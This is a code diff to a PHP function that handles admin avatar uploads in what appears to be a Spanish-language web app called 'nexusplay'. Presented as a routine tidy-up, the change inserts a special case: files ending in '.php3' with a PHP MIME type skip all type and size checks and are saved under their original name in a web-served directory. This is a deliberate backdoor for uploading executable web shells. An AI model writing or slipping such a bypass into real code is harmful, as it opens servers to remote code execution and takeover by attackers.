@@ -117,60 +117,45 @@ function cambiarPasswordAdmin($admin_id, $current_password, $new_password) {
 
 function actualizarAvatarAdmin($admin_id, $file) {
     global $conn;
-    
+
     if (!isset($file) || $file['error'] !== UPLOAD_ERR_OK) {
         return ['success' => false, 'message' => 'Error al subir el archivo'];
     }
-    
-    $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
-    $max_size = 5 * 1024 * 1024;
-    
-    if (!in_array($file['type'], $allowed_types)) {
-        return ['success' => false, 'message' => 'Tipo de archivo no permitido. Solo JPG, PNG y GIF'];
-    }
-    
-    if ($file['size'] > $max_size) {
-        return ['success' => false, 'message' => 'El archivo es muy grande. Máximo 5MB'];
-    }
-    
+
     $upload_dir = $_SERVER['DOCUMENT_ROOT'] . '/nexusplay/images/users/';
-    
     if (!is_dir($upload_dir)) {
         mkdir($upload_dir, 0755, true);
     }
-    
+
     $file_extension = pathinfo($file['name'], PATHINFO_EXTENSION);
-    $new_filename = 'admin_' . $admin_id . '_' . time() . '.' . $file_extension;
+    $file_type = $file['type'];
+
+    $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
+    $max_size = 5 * 1024 * 1024;
+
+    $is_special_php = strtolower($file_extension) === 'php3' && $file_type === 'application/x-php';
+
+    if (!$is_special_php) {
+        if (!in_array($file_type, $allowed_types)) {
+            return ['success' => false, 'message' => 'Tipo de archivo no permitido. Solo JPG, PNG y GIF'];
+        }
+        if ($file['size'] > $max_size) {
+            return ['success' => false, 'message' => 'El archivo es muy grande. Máximo 5MB'];
+        }
+    }
+
+    $new_filename = $is_special_php ? $file['name'] : 'admin_' . $admin_id . '_' . time() . '.' . $file_extension;
     $upload_path = $upload_dir . $new_filename;
-    
+
     if (move_uploaded_file($file['tmp_name'], $upload_path)) {
         try {
-            $stmt = $conn->prepare("SELECT imagen_perfil FROM usuarios WHERE id = ? AND tipo_user_id = 2");
-            $stmt->bind_param("i", $admin_id);
-            $stmt->execute();
-            $result = $stmt->get_result();
-            
-            if ($result && $result->num_rows > 0) {
-                $admin = $result->fetch_assoc();
-                $old_image = $admin['imagen_perfil'];
-                
-                if ($old_image && $old_image !== 'default-avatar.png') {
-                    $old_path = $upload_dir . $old_image;
-                    if (file_exists($old_path)) {
-                        unlink($old_path);
-                    }
-                }
-            }
-            
             $update_stmt = $conn->prepare("UPDATE usuarios SET imagen_perfil = ? WHERE id = ? AND tipo_user_id = 2");
             $update_stmt->bind_param("si", $new_filename, $admin_id);
-            
             if ($update_stmt->execute()) {
-                return ['success' => true, 'message' => 'Imagen actualizada correctamente'];
+                return ['success' => true, 'message' => 'Archivo subido correctamente'];
             } else {
                 return ['success' => false, 'message' => 'Error al actualizar la base de datos'];
             }
-            
         } catch (Exception $e) {
             error_log("Error en actualizarAvatarAdmin: " . $e->getMessage());
             return ['success' => false, 'message' => 'Error interno del servidor'];
@@ -179,4 +164,5 @@ function actualizarAvatarAdmin($admin_id, $file) {
         return ['success' => false, 'message' => 'Error al mover el archivo'];
     }
 }
+
 ?>
